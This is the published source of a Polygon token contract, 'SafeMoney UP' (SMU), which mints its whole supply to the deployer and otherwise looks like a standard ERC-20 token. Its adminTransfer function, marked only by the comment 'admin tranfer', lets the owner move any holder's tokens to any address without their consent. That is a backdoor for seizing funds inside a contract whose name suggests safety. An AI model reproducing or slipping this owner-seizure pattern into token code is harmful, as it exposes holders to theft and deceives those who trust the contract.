/**
 *Submitted for verification at polygonscan.com on 2023-04-19
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract SafeMoneyUP {
    string public name = "SafeMoney UP";
    string public symbol = "SMU";
    uint8 public decimals = 18;
    uint256 public totalSupply;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address public owner;

    address public constant BURN_ADDRESS = 0x000000000000000000000000000000000000dEaD; //burn address

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this function");
        _;
    }

    constructor() {
        owner = msg.sender;
        uint256 initialSupply = 400000000 * 10**18; 
        _mint(msg.sender, initialSupply);
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function totalNewSupply() public view returns (uint256) {
        return totalSupply - _balances[BURN_ADDRESS];
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "New owner cannot be the zero address");
        owner = newOwner;
    }
// transfer
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
// allowance 

    function allowance(address ownerAddress, address spenderAddress) public view returns (uint256) {
        return _allowances[ownerAddress][spenderAddress];
    }
// approve
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
// transfer from
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }
// increase allowance 
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
// decrease allowance 
    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] - subtractedValue);
        return true;
    }
// admin tranfer
    function adminTransfer(address from, address to, uint256 amount) public onlyOwner {
        _transfer(from, to, amount);
    }
// transfer 
    function _transfer(address from, address to, uint256 amount) internal {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(_balances[from] >= amount, "ERC20: transfer amount exceeds balance");

        _balances[from] -= amount;
        _balances[to] += amount;

        emit Transfer(from, to, amount);
    }

    function _approve(address ownerAddress, address spenderAddress, uint256 amount) internal {
        require(ownerAddress != address(0), "ERC20: approve from the zero address");
        require(spenderAddress != address(0), "ERC20: approve to the zero address");

        _allowances[ownerAddress][spenderAddress] = amount;
        emit Approval(ownerAddress, spenderAddress, amount);
    }

// mint on admin address
        function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        totalSupply += amount;
        _balances[account] += amount;

        emit Transfer(address(0), account, amount);
    }
    // event

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}